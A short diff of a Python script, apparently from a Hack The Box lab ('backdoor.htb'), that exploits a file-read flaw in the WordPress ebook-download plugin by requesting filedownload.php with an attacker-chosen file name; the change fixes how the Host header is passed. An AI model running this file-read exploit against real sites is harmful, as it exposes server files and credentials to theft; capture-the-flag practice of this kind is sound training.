@@ -11,7 +11,7 @@ def main():
 
     filename = sys.argv[1]
     url = f'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={filename}'
-    res = requests.get(url, {'Host': 'backdoor.htb'})
+    res = requests.get(url, headers={'Host': 'backdoor.htb'})
 
     first_line = 3 * filename
     last_line = '<script>window.close()</script>'
